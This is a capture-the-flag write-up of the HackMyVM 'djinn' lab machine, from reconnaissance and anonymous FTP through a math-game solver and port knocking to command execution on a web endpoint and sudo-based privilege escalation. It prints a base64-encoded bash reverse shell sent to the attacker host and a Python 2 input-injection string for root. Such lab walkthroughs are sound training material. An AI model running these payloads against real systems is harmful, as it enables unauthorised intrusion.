# djinn

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| djinn | zenmpi | Beginner | HackMyVM |

**Summary:** The djinn machine is a multi-stage beginner-level challenge hosted on HackMyVM. The attack path begins with a host discovery scan followed by a thorough service enumeration using Nmap, which reveals four notable services: an anonymous-accessible FTP server on port 21 carrying three plaintext files including credentials and a game hint, a filtered SSH service on port 22, a custom TCP math-game daemon on port 1337 that rewards solving 1000 arithmetic questions with a port-knocking sequence, and a Python Werkzeug web application on port 7331 running a deliberately vulnerable command execution endpoint. The attacker leverages FTP to extract information, writes a Python socket automation script to beat the math game and receive the port-knocking sequence, performs port knocking to unfilter SSH, discovers the web application's hidden `/wish` endpoint through directory fuzzing, confirms Remote Code Execution (RCE) via the `cmd` POST parameter, and obtains an initial reverse shell as `www-data`. Lateral movement to the `nitish` user is achieved by reading a cleartext credential file from a world-readable hidden directory. From `nitish`, a NOPASSWD sudo rule permits execution of a custom SUID binary (`/usr/bin/genie`) as the `sam` user. From `sam`, a second NOPASSWD sudo rule permits execution of a Python 2 script (`/root/lago`) as root. Because the script uses Python 2's `raw_input()`, it is vulnerable to arbitrary expression injection, which allows spawning a root shell by injecting `__import__('os').system('/bin/bash')` directly at the input prompt.

---

## Phase 1: Reconnaissance

### Host Discovery

The network was scanned using a custom PowerShell script to identify live VirtualBox guests on the local subnet `192.168.100.0/24`.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.148 08:00:27:1F:DE:04 VirtualBox
```

The target was identified at `192.168.100.148`. The MAC vendor confirms it is a VirtualBox instance.

### Port and Service Enumeration

A full-port aggressive Nmap scan with service version detection and default scripts was run against the target.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/djinn]
└─$ nmap -sC -sV -p- -T4 192.168.100.148
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-07 10:36 WIB
Nmap scan report for 192.168.100.148
Host is up (0.0025s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
| -rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
|_-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.100.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   filtered ssh
1337/tcp open     waste?
| fingerprint-strings:
|   NULL:
|     ____ _____ _
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|     '/', 4)
|   RPCCheck:
|     ____ _____ _
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|_    '-', 2)
7331/tcp open     http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
|_http-title: Lost in space
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.95%I=7%D=3/7%Time=69AB9D54%P=x86_64-pc-linux-gnu%r(NUL
SF:L,1BC,"\x20\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__\x
SF:20_\x20_\x20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x20_
SF:_\x20___\x20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20'_\x
SF:20`\x20_\x20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20'_\x2
SF:0`\x20_\x20\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|\x
SF:20\|\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20\|\x20\|
SF:\x20\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|\x20\|_\
SF:x20\|\\___\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n
SF:\nLet's\x20see\x20how\x20good\x20you\x20are\x20with\x20simple\x20maths\
SF:nAnswer\x20my\x20questions\x201000\x20times\x20and\x20I'll\x20give\x20y
SF:ou\x20your\x20gift\.\n\(9,\x20'/',\x204\)\n>\x20")%r(RPCCheck,1BC,"\x20
SF:\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__\x20_\x20_\x2
SF:0__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x20__\x20___\x2
SF:0\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20'_\x20`\x20_\x2
SF:0\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20'_\x20`\x20_\x20
SF:\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|\x20\|\x20\|\
SF:x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20\|\x20\|\x20\
SF:|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|\x20\|_\|\\__
SF:_\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\nLet's\x20see\
SF:x20how\x20good\x20you\x20are\x20with\x20simple\x20maths\nAnswer\x20my\x2
SF:0questions\x201000\x20times\x20and\x20I'll\x20give\x20you\x20your\x20gi
SF:ft\.\n\(5,\x20'-',\x202\)\n>\x20");
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.29 seconds
```

The scan reveals four key services. Port 21 runs vsFTPd 3.0.3 with anonymous login explicitly permitted and three files already visible in the FTP root. Port 22 is in a **filtered** state, meaning a firewall or port-knocking mechanism is actively blocking it. Port 1337 is an unrecognized raw TCP service that immediately presents an ASCII banner named "Game Time" and demands the client answer 1000 arithmetic problems in exchange for a "gift." Port 7331 is a Werkzeug/Python 2.7.15+ HTTP server with the page title "Lost in space."

---

## Phase 2: FTP Enumeration (Port 21)

Anonymous FTP is allowed. Three files were retrieved using `mget *`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/djinn]
└─$ ftp 192.168.100.148
Connected to 192.168.100.148.
220 (vsFTPd 3.0.3)
Name (192.168.100.148:ouba): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||38538|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 21  2019 .
drwxr-xr-x    2 0        115          4096 Oct 21  2019 ..
-rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
-rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
226 Directory send OK.
ftp> mget *
mget creds.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||22269|)
150 Opening BINARY mode data connection for creds.txt (11 bytes).
100% |*************|    11        0.98 KiB/s    00:00 ETA
226 Transfer complete.
11 bytes received in 00:00 (0.75 KiB/s)
mget game.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||30203|)
150 Opening BINARY mode data connection for game.txt (128 bytes).
100% |*************|   128       19.70 KiB/s    00:00 ETA
226 Transfer complete.
128 bytes received in 00:00 (13.68 KiB/s)
mget message.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||55170|)
150 Opening BINARY mode data connection for message.txt (113 bytes).
100% |*************|   113       15.45 KiB/s    00:00 ETA
226 Transfer complete.
113 bytes received in 00:00 (11.56 KiB/s)
ftp> bye
221 Goodbye.
```

The contents of the three retrieved files were read and are reproduced in full below.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/djinn]
└─$ cat creds.txt
nitu:81299

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/djinn]
└─$ cat game.txt
oh and I forgot to tell you I've setup a game for you on port 1337. See if you can reach to the
final level and get the prize.

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/djinn]
└─$ cat message.txt
@nitish81299 I am going on holidays for few days, please take care of all the work.
And don't mess up anything.
```

Three valuable intelligence pieces emerge. `creds.txt` contains a plaintext username-password pair `nitu:81299` — the username strongly resembles a shortened form of `nitish`, matching the system account discovered later. `game.txt` explicitly confirms the purpose of port 1337 and hints that completing the challenge yields a prize. `message.txt` reveals the internal username `@nitish81299`, confirming the existence of a `nitish` account on the system and the involvement of another user named `mzfr` (visible in the web app brand as well).

---

## Phase 3: Port 1337 — The Math Game and Port Knocking

### Initial Manual Probe

Attempting to access port 1337 via a browser results in a browser-level protocol error because the service speaks a raw custom ASCII protocol over TCP, not HTTP.

![](image.png)

The browser reports `ERR_INVALID_HTTP_RESPONSE` because the server is not an HTTP service — it is a raw TCP socket service that immediately pushes a plain-text ASCII banner the moment a connection is established.

Connecting via `netcat` reveals the actual protocol.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/djinn]
└─$ nc 192.168.100.148 1337
  ____                        _____ _
 / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___
| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
 \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|


Let's see how good you are with simple maths
Answer my questions 1000 times and I'll give you your gift.
(1, '*', 9)
> 9
(7, '/', 3)
> 2.3
(8, '*', 6)
> 48
(3, '*', 3)
> 9
(8, '*', 9)
> 72
(9, '*', 4)
```

The service sends tuples of the form `(num1, 'operator', num2)` and waits for the correct numeric answer. Since this must be done 1000 consecutive times, manual answering is impractical. A Python automation script was written.

### Python Automation Script

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/djinn]
└─$ cat 1337.py
import socket
import re

def solve():
    host = "192.168.100.148"
    port = 1337

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    buffer = ""

    try:
        while True:
            char = s.recv(1).decode('utf-8')
            if not char:
                break

            buffer += char
            print(char, end="", flush=True)

            if '>' in char:
                match = re.search(r"\((\d+),\s+'([\+\-\*\/])',\s+(\d+)\)", buffer)
                if match:
                    num1 = int(match.group(1))
                    op = match.group(2)
                    num2 = int(match.group(3))

                    if op == '+': res = num1 + num2
                    elif op == '-': res = num1 - num2
                    elif op == '*': res = num1 * num2
                    elif op == '/': res = round(float(num1) / num2, 1)

                    s.sendall((str(res) + "\n").encode('utf-8'))

                    buffer = ""
                else:
                    pass

    except Exception as e:
        print(f"\n[!] Error: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    solve()
```

The script reads the server output one character at a time, accumulates it in a buffer, and when it detects the `>` prompt character it applies a regex to extract both operands and the operator, performs the correct arithmetic operation (using Python float division with rounding for the `/` operator to match the server's expected format), then immediately sends the answer back. After all 1000 rounds are answered, the server reveals its gift.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/djinn]
└─$ python3 1337.py
  ____                        _____ _
 / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___
| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
 \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|


Let's see how good you are with simple maths
Answer my questions 1000 times and I'll give you your gift.
(3, '/', 3)
> (2, '*', 2)
> (9, '-', 8)
> (9, '-', 8)
> (8, '*', 8)
...
> (6, '-', 1)
> (4, '*', 2)
> Here is your gift, I hope you know what to do with it:

1356, 6784, 3409
```

The server rewards completing all 1000 rounds with three port numbers: `1356`, `6784`, `3409`. These are a **port knocking sequence** that must be "knocked" in order to trigger a firewall rule that opens the previously filtered SSH port 22.

### Port Knocking to Open SSH

A for-loop using Nmap was used to knock on each port in sequence, sending a single connection attempt to each port.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/djinn]
└─$ for x in 1356 6784 3409; do nmap -Pn -p $x --max-retries 0 192.168.100.148; done
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-07 11:07 WIB
Nmap scan report for 192.168.100.148
Host is up (0.0013s latency).

PORT     STATE  SERVICE
1356/tcp closed cuillamartin

Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-07 11:07 WIB
Nmap scan report for 192.168.100.148
Host is up (0.00091s latency).

PORT     STATE  SERVICE
6784/tcp closed bfd-lag

Nmap done: 1 IP address (1 host up) scanned in 1.11 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-07 11:07 WIB
Nmap scan report for 192.168.100.148
Host is up (0.0011s latency).

PORT     STATE  SERVICE
3409/tcp closed networklens

Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds
```

Each port shows as `closed` rather than `filtered`, which means the TCP SYN packet reached the host and was logged by the port-knocking daemon. After the sequence is sent, port 22 transitions from `filtered` to `open`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/djinn]
└─$ nmap -p 22 192.168.100.148
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-07 11:07 WIB
Nmap scan report for 192.168.100.148
Host is up (0.0010s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 1.21 seconds
```

SSH is now accessible. Port knocking is confirmed to be implemented on this machine using `knockd` or an equivalent daemon. The sequence `1356 → 6784 → 3409` triggers the firewall to permanently open port 22 for the connecting IP.

---

## Phase 4: Web Application Enumeration (Port 7331)

### Web Application Overview

The Werkzeug web server on port 7331 serves a Bootstrap-based landing page. The page title according to Nmap is "Lost in space."

![](image-1.png)

The page is branded with the name **mzfr** in the top-left corner, which corresponds to the developer mentioned in `message.txt`. The page prominently displays the text **"Let's see how good your are."** (note the intentional or unintentional grammatical error — "your" instead of "you're"). The page footer reads "Cover template for Bootstrap, by @mdo," confirming this is a standard Bootstrap cover template customized for the challenge. The navigation links (Home, Features, Contact) lead nowhere; this is a static landing page. The underlying HTML source exposes the internal path structure.

### Source Code Review

The HTML source reveals that static assets are served from `../static/css/`, indicating the Flask/Werkzeug application is using a conventional directory layout. The brand name `mzfr` in the source at line `<h3 class="masthead-brand">mzfr</h3>` corroborates the developer identity hinted at in the FTP notes.

```javascript

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <title>Lost in space</title>

    <!-- Bootstrap core CSS -->
    <!-- <link href="../../dist/css/bootstrap.min.css" rel="stylesheet"> -->

    <!-- Custom styles for this template -->
    <link href="../static/css/cover.css" rel="stylesheet">
  </head>

  <body>

    <div class="site-wrapper">

      <div class="site-wrapper-inner">

        <div class="cover-container">

          <div class="masthead clearfix">
            <div class="inner">
              <h3 class="masthead-brand">mzfr</h3>
              <nav class="nav nav-masthead">
                <a class="nav-link" href="#">Home</a>
                <a class="nav-link" href="#">Features</a>
                <a class="nav-link" href="#">Contact</a>
              </nav>
            </div>
          </div>

          <div class="inner cover">
            <h1 class="cover-heading">Let's see how good your are.</h1>
            </div>

          <div class="mastfoot">
            <div class="inner">
              <p>Cover template for <a href="https://getbootstrap.com">Bootstrap</a>, by <a href="https://twitter.com/mdo">@mdo</a>.</p>
            </div>
          </div>

        </div>

      </div>

    </div>

    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://code.jquery.com/jquery-3.1.1.slim.min.js" integrity="sha384-A7FZj7v+d/sdmMqp/nOQwliLvUsJfDHW+k9Omg/a/EheAdgtzNs3hpfag6Ed950n" crossorigin="anonymous"></script>
    <!-- <script>window.jQuery || document.write('<script src="../../assets/js/vendor/jquery.min.js"><\/script>')</script> -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.4.0/js/tether.min.js" integrity="sha384-DztdAPBWPRXSA/3eYEEUWrWCy7G5KFbe8fFjk5JAIxUYHKkDx6Qin1DkWx51bBrb" crossorigin="anonymous"></script>
    <!-- <script src="../../dist/js/bootstrap.min.js"></script> -->
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <!-- <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script> -->
  </body>
</html>
```

### Directory Fuzzing with Feroxbuster

Feroxbuster was used to brute-force directories and endpoints on the web application using the raft-medium-directories wordlist.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/djinn]
└─$ feroxbuster -u http://192.168.100.148:7331/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.148:7331/
 🚩  In-Scope Url          │ 192.168.100.148
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        4l       34w      232c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      160l      306w     2322c http://192.168.100.148:7331/static/css/cover.css
200      GET       61l      147w     2266c http://192.168.100.148:7331/
200      GET       21l       43w      385c http://192.168.100.148:7331/wish
200      GET      145l      382w     3168c http://192.168.100.148:7331/static/css/forbidden.css
200      GET       41l       91w     1676c http://192.168.100.148:7331/genie
```

Feroxbuster discovers two notable endpoints. The `/wish` endpoint returns a 21-line 385-byte page, and `/genie` returns a 41-line 1676-byte page. The naming is thematic — matching the "djinn/genie/wish" concept of the machine — but more importantly, these names reveal that the web app was written by `mzfr` whose name also appears as the web brand.

---

## Phase 5: Initial Access via Remote Code Execution

### Confirming RCE on /wish

Fetching the `/wish` endpoint reveals a simple HTML form that accepts a `cmd` parameter via POST.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/djinn]
└─$ curl -i http://192.168.100.148:7331/wish
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 385
Server: Werkzeug/0.16.0 Python/2.7.15+
Date: Sat, 07 Mar 2026 04:16:58 GMT

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Make wishes</title>
</head>

<body>
  <form method="POST" action="/wish">
  <p>Oh you found me then go on make a wish.</p>

   <p>This can make all your wishes come true</p>


    Execute: <input type="text" name="cmd" required><br>
    <input type="submit" value="Submit">
    </form>
</body>

</html>
```

The form element with `name="cmd"` is a direct command execution interface. The server header confirms this is `Werkzeug/0.16.0 Python/2.7.15+`, a known legacy framework. A POST request with `cmd=id` was sent to confirm command execution.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/djinn]
└─$ curl -i http://192.168.100.148:7331/wish -X POST -d "cmd=id"
HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 379
Location: http://192.168.100.148:7331/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A
Server: Werkzeug/0.16.0 Python/2.7.15+
Date: Sat, 07 Mar 2026 04:18:03 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A">/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A</a>.  If not click the link.
```

The response is a 302 redirect to `/genie` with the command output URL-encoded in the `name` parameter. Decoding `uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A` gives `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. Remote Code Execution as `www-data` is confirmed.

### Reverse Shell Delivery

A bash reverse shell payload was base64-encoded to avoid special character issues with the POST parameter.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/djinn]
└─$ echo "bash -i >& /dev/tcp/192.168.100.1/4444 0>&1" | base64 -w 0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xLzQ0NDQgMD4mMQo=

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/djinn]
└─$ echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xLzQ0NDQgMD4mMQo=' | base64 -d | bash
```

A Netcat listener was set up on port 4444 to receive the connection.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/djinn]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

The payload was then delivered to the `/wish` endpoint via a URL-encoded POST request using `--data-urlencode` to properly handle the base64 string, spaces, and pipe characters.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/djinn]
└─$ curl -X POST http://192.168.100.148:7331/wish --data-urlencode "cmd=echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xLzQ0NDQgMD4mMQo=' | base64 -d | bash"
```

The listener received the reverse shell connection.

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 55133
bash: cannot set terminal process group (595): Inappropriate ioctl for device
bash: no job control in this shell
www-data@djinn:/opt/80$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@djinn:/opt/80$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/djinn]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@djinn:/opt/80$ export SHELL=/bin/bash
www-data@djinn:/opt/80$ export TERM=xterm-256color
www-data@djinn:/opt/80$ stty rows 64 cols 124
```

A fully interactive PTY was obtained by spawning `/bin/bash` via Python's `pty` module, suspending the shell with `Ctrl+Z`, issuing `stty raw -echo; fg` to pass raw keystrokes through to the remote terminal, and setting the correct `SHELL`, `TERM`, and terminal dimensions. The working directory `/opt/80` reveals the Flask application is served from port 80's sibling directory under `/opt`.

---

## Phase 6: Local Enumeration and Lateral Movement to nitish

### Enumerating Users

```bash
www-data@djinn:/opt/80$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
sam:x:1000:1000:sam,,,:/home/sam:/bin/bash
nitish:x:1001:1001::/home/nitish:/bin/bash
www-data@djinn:/opt/80$ ls -la /home
total 16
drwxr-xr-x  4 root   root   4096 Nov 14  2019 .
drwxr-xr-x 23 root   root   4096 Nov 11  2019 ..
drwxr-xr-x  6 nitish nitish 4096 Apr 23  2022 nitish
drwxr-x---  4 sam    sam    4096 Nov 14  2019 sam
www-data@djinn:/opt/80$ ls -la /home/nitish/
total 36
drwxr-xr-x 6 nitish nitish 4096 Apr 23  2022 .
drwxr-xr-x 4 root   root   4096 Nov 14  2019 ..
-rw------- 1 root   root    414 Apr 23  2022 .bash_history
-rw-r--r-- 1 nitish nitish 3771 Nov 11  2019 .bashrc
drwx------ 2 nitish nitish 4096 Nov 11  2019 .cache
drwxr-xr-x 2 nitish nitish 4096 Oct 21  2019 .dev
drwx------ 3 nitish nitish 4096 Nov 11  2019 .gnupg
drwxrwxr-x 3 nitish nitish 4096 Apr 23  2022 .local
-rw-r----- 1 nitish nitish   38 Apr 23  2022 user.txt
```

Two users with shell access exist: `sam` (uid 1000) and `nitish` (uid 1001). The `sam` home directory is restricted (`drwxr-x---`), but `nitish`'s home is world-readable (`drwxr-xr-x`). Notably, a hidden `.dev` directory inside `/home/nitish/` is also world-readable.

### Discovering Cleartext Credentials

```bash
www-data@djinn:/opt/80$ cd /home/nitish/.dev/
www-data@djinn:/home/nitish/.dev$ ls -la
total 12
drwxr-xr-x 2 nitish nitish 4096 Oct 21  2019 .
drwxr-xr-x 6 nitish nitish 4096 Apr 23  2022 ..
-rw-r--r-- 1 nitish nitish   24 Oct 21  2019 creds.txt
www-data@djinn:/home/nitish/.dev$ cat creds.txt
nitish:p4s[REDACTED]
www-data@djinn:/home/nitish/.dev$ su - nitish
Password:
nitish@djinn:~$ id
uid=1001(nitish) gid=1001(nitish) groups=1001(nitish)
```

The `/home/nitish/.dev/creds.txt` file is world-readable and contains `nitish`'s plaintext password. Using `su - nitish` with this password succeeds immediately and provides a fully authenticated shell as `nitish`.

---

## Phase 7: Privilege Escalation — nitish to sam via sudo and genie

### Sudo Enumeration as nitish

```bash
nitish@djinn:~$ which sudo
/usr/bin/sudo
nitish@djinn:~$ sudo -l
Matching Defaults entries for nitish on djinn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nitish may run the following commands on djinn:
    (sam) NOPASSWD: /usr/bin/genie
nitish@djinn:~$ file /usr/bin/genie
/usr/bin/genie: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=3f0b0d4d3dacca65084b0fbe690cac95d143e61a, not stripped
nitish@djinn:~$ ls -la /usr/bin/genie
-rwsr-x--- 1 sam nitish 72000 Nov 11  2019 /usr/bin/genie
```

The `sudo -l` output reveals that `nitish` can execute `/usr/bin/genie` as the `sam` user without a password. The binary is a 64-bit ELF with the setuid bit (`rwsr-x---`) set, owned by `sam` and group-accessible only to `nitish`. The binary is not stripped, which means symbol names are preserved.

### Exploring the genie Binary

Initial attempts to pass a shell via the `-cmd` flag show that a shell argument is blocked, but a system command like `id` is accepted.

```bash
nitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd '/bin/bash'
Pass your wish to GOD, he might be able to help you.
nitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd id
my man!!
$ id
uid=1000(sam) gid=1000(sam) groups=1000(sam),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
$ /bin/bash
sam@djinn:~$ sudo -l
Matching Defaults entries for sam on djinn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sam may run the following commands on djinn:
    (root) NOPASSWD: /root/lago
```

Running `sudo -u sam /usr/bin/genie -cmd id` drops into a `$` shell running as `sam`. Executing `/bin/bash` from within that shell upgrades it to a proper Bash prompt. The `sudo -l` check as `sam` reveals another NOPASSWD entry: `/root/lago` can be run as `root` without a password.

---

## Phase 8: Privilege Escalation — sam to root via lago Python Injection

### Examining the lago Script

```bash
sam@djinn:~$ sudo -u root /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:3
Enter the full of the file to read: ^CTraceback (most recent call last):
  File "/root/lago", line 161, in <module>
    main(options())
  File "/root/lago", line 145, in main
    readfiles()
  File "/root/lago", line 77, in readfiles
    path = raw_input("Enter the full of the file to read: ")
KeyboardInterrupt
```

